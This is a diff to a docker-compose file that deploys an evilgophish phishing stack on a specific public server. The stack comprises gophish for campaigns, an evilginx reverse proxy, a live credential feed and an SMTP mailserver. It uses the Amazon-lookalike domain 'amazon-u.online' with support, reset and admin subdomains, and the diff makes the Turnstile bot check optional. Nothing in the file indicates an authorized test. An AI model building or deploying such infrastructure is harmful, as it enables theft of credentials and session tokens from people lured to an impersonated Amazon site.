@@ -1,6 +1,6 @@
 # docker-compose.yml
-# Setup for evilgophish with SMTP (docker-mailserver) on Lightsail (3.147.37.21).
-# Changes: Domain updated to amazon-u.online; validates src/evilginx; ensures mailconfig.
+# Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
+# Changes: Domain amazon-u.online; Turnstile optional; validates src/evilginx; ensures mailconfig.
 # Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time), mailserver (SMTP).
 # Volumes: Persistent for data/logs/uploads; mailconfig for DKIM/postfix.
 # Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
@@ -81,15 +81,15 @@ services:
       - SUBDOMAINS=${SUBDOMAINS:-support,email,reset,admin}
       - PROXY_ROOT=${PROXY_ROOT:-true}
       - RID_REPLACEMENT=${RID_REPLACEMENT:-user_id}
-      - TURNSTILE_PUBLIC=${TURNSTILE_PUBLIC}
-      - TURNSTILE_PRIVATE=${TURNSTILE_PRIVATE}
+      - TURNSTILE_PUBLIC=${TURNSTILE_PUBLIC:-}
+      - TURNSTILE_PRIVATE=${TURNSTILE_PRIVATE:-}
       - GOPHISH_DB=/app/data/gophish.db
       - FEED_ENABLED=${FEED_ENABLED:-true}
     command: >
       sh -c "
         evilginx -g /app/data/gophish.db
-        -turnstile $${TURNSTILE_PUBLIC:-none}:$${TURNSTILE_PRIVATE:-none}
-        $${FEED_ENABLED:+ -feed}
+        ${TURNSTILE_PUBLIC:+-turnstile $TURNSTILE_PUBLIC:$TURNSTILE_PRIVATE}
+        ${FEED_ENABLED:+ -feed}
       "
     depends_on:
       - gophish
